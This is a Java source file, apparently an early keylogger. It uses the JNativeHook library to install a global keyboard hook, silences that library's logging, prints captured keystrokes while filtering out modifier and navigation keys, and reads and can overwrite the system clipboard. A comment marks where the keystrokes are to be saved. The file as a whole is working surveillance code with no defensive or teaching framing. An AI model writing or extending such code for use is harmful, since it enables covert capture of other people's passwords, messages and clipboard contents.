package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.awt.Toolkit;
import java.awt.datatransfer.*;
import java.io.IOException;


public class Main implements NativeKeyListener {
	
	public static void main(String[] args) {
		try {
		GlobalScreen.registerNativeHook();
		} catch (NativeHookException e ) {
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new Main());
		
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		// Change the level for all handlers attached to the default logger.
		Handler[] handlers = Logger.getLogger("").getHandlers();
		for (int i = 0; i < handlers.length; i++) {
			handlers[i].setLevel(Level.OFF);
		}
		
		
		try{
			System.out.println("Clipboard: " + readClipboard());
		}catch (IOException e) {
			//TODO: handle exception
		}

	}
	    @Override
	    public void nativeKeyPressed(NativeKeyEvent e) {
	    	if(containsLoggerKey(NativeKeyEvent.getKeyText(e.getKeyCode())) == false) {
	    		//does nothing, except keep useless keys from outputting
	    	}else {
	    		// save the output of the following keys here
	    		System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()) + "" );
	    	}
	    }

	    @Override
	    public void nativeKeyReleased(NativeKeyEvent e) {
	    	//System.out.println("KeyReleased " + NativeKeyEvent.getKeyText(e.getKeyCode()));

	    }

	    @Override
	    public void nativeKeyTyped(NativeKeyEvent e) {
	    
		
	}

	public static String readClipboard() throws IOException{
		Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
		Transferable t = cb.getContents(null);
		try{
			String data = (String) t.getTransferData(DataFlavor.stringFlavor);
			return data;
		}catch(UnsupportedFlavorException e) {}
		return "";
		
	}

	public static void writeClipboard(String toClipbboard){
		StringSelection stringSelection = new StringSelection(toClipbboard);
		Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
		cb.setContents(stringSelection, null);
	}

	public boolean containsLoggerKey(String key) {
		switch(key) {
		  case "Tab":
				  return false;
		  case "Space":
				  return false;
		  case "Shift":
				return false;
		  case "Return":
				return false;
		  case "Delete":
				  return false;
		  case "Backspace":
				  return false;
		  case "Enter":
				return false;
		  case "Ctrl":
				return false;	
		  case "Alt":
				  return false;
		  case "Meta":
				  return false;
		  case "Escape":
				return false;
		  case "Undefined":
				return false;
		  case "Left":
				  return false;
		  case "Down":
				  return false;
		  case "Right":
				return false;
		  case "Up":
				return false;
		  case "Unknown keyCode: 0xe36":
				  return false;
		  default:
			return true;
		}

			
	}
}